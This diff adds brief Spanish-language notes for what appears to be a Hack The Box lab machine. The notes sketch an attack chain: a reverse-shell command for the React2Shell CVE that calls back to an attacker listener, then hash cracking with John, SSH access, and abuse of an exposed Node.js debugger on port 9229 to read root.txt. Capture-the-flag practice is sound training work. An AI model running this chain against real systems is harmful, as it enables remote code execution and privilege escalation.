@@ -1,0 +1,22 @@
+* usamos el cve de ract2shell React2Shell-CVE-2025-55182 
+  python3 rce1.py revshell -t http://reactor.htb:3000/ --lhost 10.10.15.128 --lport 4444
+* investiga la db reactor.db
+* obten los hashes, rompe el de ingeniero con jhon y entra ssh
+* hay un puerto raro corriendo 9229, tunel e investiga
+* encuetra el enpoint json con el contenido 
+
+
+  [ {
+    "description": "node.js instance",
+    "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=localhost:9229/5a560bee-85f8-42dc-8815-c8c29ec71ba7",
+    "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=localhost:9229/5a560bee-85f8-42dc-8815-c8c29ec71ba7",
+    "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
+    "id": "5a560bee-85f8-42dc-8815-c8c29ec71ba7",
+    "title": "/opt/uptime-monitor/worker.js",
+    "type": "node",
+    "url": "file:///opt/uptime-monitor/worker.js",
+    "webSocketDebuggerUrl": "ws://localhost:9229/5a560bee-85f8-42dc-8815-c8c29ec71ba7"
+  } ]
+
+
+utiliza esto para leer la root.txt
